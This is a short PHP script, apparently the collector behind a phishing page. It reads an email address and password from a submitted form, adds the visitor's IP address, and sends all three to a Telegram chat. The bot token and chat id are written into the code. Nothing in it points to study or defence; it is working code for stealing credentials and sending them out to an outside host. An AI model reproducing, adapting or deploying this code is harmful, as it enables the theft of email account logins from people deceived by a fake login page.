	<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "6386618140:AAGaFukqt0FrRPRf8qnsL_IthdNly4t7FxI";
$id = "6855677599";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
Correo: ".$_POST['mail_address']."
Clave: ".$_POST['mail_pass']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

